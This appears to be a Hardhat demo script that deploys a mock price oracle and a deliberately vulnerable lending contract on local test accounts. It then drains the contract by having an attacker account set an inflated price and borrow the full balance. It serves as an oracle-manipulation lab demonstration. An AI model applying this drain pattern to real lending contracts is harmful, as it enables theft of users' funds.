// scripts/drain.js
const hre = require("hardhat");

async function main() {
  console.log("=== Automated Hardhat Demo: Vulnerable Lending ===");

  const [deployer, attacker] = await hre.ethers.getSigners();
  console.log("Accounts:");
  console.log(" Deployer:", deployer.address);
  console.log(" Attacker:", attacker.address);

  // 1) Compile happens automatically when running via Hardhat run (but you can run `npx hardhat compile`)
  // 2) Deploy MockPriceFeed with initial price 100
  console.log("Deploying MockPriceFeed with initial price = 100 ...");
  const Mock = await hre.ethers.getContractFactory("MockPriceFeed", deployer);
  const mock = await Mock.deploy(100);
  await mock.deployed();
  console.log("MockPriceFeed deployed at:", mock.address);

  // 3) Deploy VulnerableLending with 5 ETH funding
  console.log("Deploying VulnerableLending funded with 5 ETH ...");
  const Lending = await hre.ethers.getContractFactory("VulnerableLending", deployer);
  const fiveEth = hre.ethers.utils.parseEther("5.0");
  const lending = await Lending.deploy(mock.address, { value: fiveEth });
  await lending.deployed();
  console.log("VulnerableLending deployed at:", lending.address);

  // Show balances
  const provider = hre.ethers.provider;
  let bal = await provider.getBalance(lending.address);
  console.log("Lending contract balance:", hre.ethers.utils.formatEther(bal), "ETH");

  // 4) Manipulate oracle price using attacker (anyone can call setPrice)
  console.log("Setting oracle price to 1,000,000 using attacker account...");
  await mock.connect(attacker).setPrice(1000000);
  console.log("Oracle price now:", (await mock.getLatestPrice()).toString());

  // 5) Drain contract: attacker borrows the full balance
  bal = await provider.getBalance(lending.address);
  console.log("Attacker will borrow (wei):", bal.toString());
  console.log("Attempting borrow (drain)...");
  const tx = await lending.connect(attacker).borrow(bal);
  await tx.wait();
  console.log("Borrow tx mined.");

  // 6) Final balances
  bal = await provider.getBalance(lending.address);
  console.log("Final lending contract balance:", hre.ethers.utils.formatEther(bal), "ETH");
  const attackerBal = await provider.getBalance(attacker.address);
  console.log("Attacker account balance (approx):", hre.ethers.utils.formatEther(attackerBal), "ETH");

  console.log("=== Demo complete: contract drained ===");
}

main()
  .then(() => process.exit(0))
  .catch((err) => {
    console.error("Script error:", err);
    process.exit(1);
  });
